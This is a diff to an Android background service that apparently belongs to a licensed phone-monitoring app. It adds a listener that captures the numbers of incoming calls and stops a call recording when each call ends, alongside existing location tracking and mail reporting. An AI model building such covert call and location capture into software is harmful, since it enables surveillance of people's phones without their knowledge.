@@ -18,6 +18,8 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Binder;
 import android.os.IBinder;
+import android.telephony.PhoneStateListener;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 
 /**
@@ -46,6 +48,38 @@ public class BootService extends Service
 	public static LocationUtil locationUtil;
 	
 	public static String gpsWord;
+	
+	public static TelephonyManager telManager;
+	public static String otherSidePhoneNum = "";
+	private final PhoneStateListener phoneListener = new PhoneStateListener() {
+		@Override
+        public void onCallStateChanged(int state, String incomingNumber) {
+			// Get incoming phone number
+			if (incomingNumber != null)	otherSidePhoneNum = incomingNumber;
+			
+            try {
+                switch (state) {
+                	case TelephonyManager.CALL_STATE_RINGING: {
+                		// 
+                		break;
+                	}
+                	case TelephonyManager.CALL_STATE_OFFHOOK: {
+                		// 
+                		break;
+                	}
+                	case TelephonyManager.CALL_STATE_IDLE: {
+        				if (PhoneCallReceiver.recordStarted) {
+        					PhoneCallReceiver.recorder.stop();
+        					PhoneCallReceiver.recordStarted = false;
+        				}
+                		break;
+                	}
+                	default: { }
+                }
+            } catch (Exception ex) {
+            }
+        } 
+    };
 
 	@Override
 	public IBinder onBind(final Intent intent) {
@@ -88,15 +122,15 @@ public class BootService extends Service
 		if (mails.length <= 0) return;
 		
 		LICENSE_TYPE type = ConfigCtrl.getLicenseType(context);
-		if (type == LICENSE_TYPE.FULL_LICENSED  ||
-			type == LICENSE_TYPE.SUPER_LICENSED ||
-			type == LICENSE_TYPE.PART_LICENSED  ||
-			(type == LICENSE_TYPE.TRIAL_LICENSED && ConfigCtrl.stillInTrial(context))) 
+		if (ConfigCtrl.isLegal(context)) 
 		{
 			// Init global variables
 			gpsWord = GlobalPrefActivity.getGpsWord(context);
 			
 			mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, mGetInfoPeriod);
+			
+			telManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
+            telManager.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
 			
 			locationUtil = new LocationUtil(getApplicationContext());
 		
